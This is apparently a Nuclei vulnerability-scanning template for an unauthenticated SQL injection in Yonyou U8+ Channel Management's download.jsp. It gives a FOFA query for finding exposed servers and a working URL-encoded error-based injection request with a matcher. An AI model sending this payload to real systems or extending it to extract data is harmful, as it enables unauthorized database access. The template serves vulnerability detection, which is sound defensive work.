id: Yonyou-U8-Channel-management-download-SQL

info:
  name: 用友U8+渠道管理(高级版) download.jsp SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa："common/images/dot.gif" && (icon_hash="737647198" || icon_hash="84729000")
    用友U8+渠道管理(高级版) download.jsp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    -
  tags: SQL Injection
  
http:
  - raw:
      - |-
        GET /business/common/download.jsp?filename=&foldertype=&file=%27+AND+9228+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289228%3D9228%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29+AND+%27BkmE%27%3D%27BkmE HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        
    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - 'status_code==500 && contains_all(body,"qxzxq1qpbxq")'
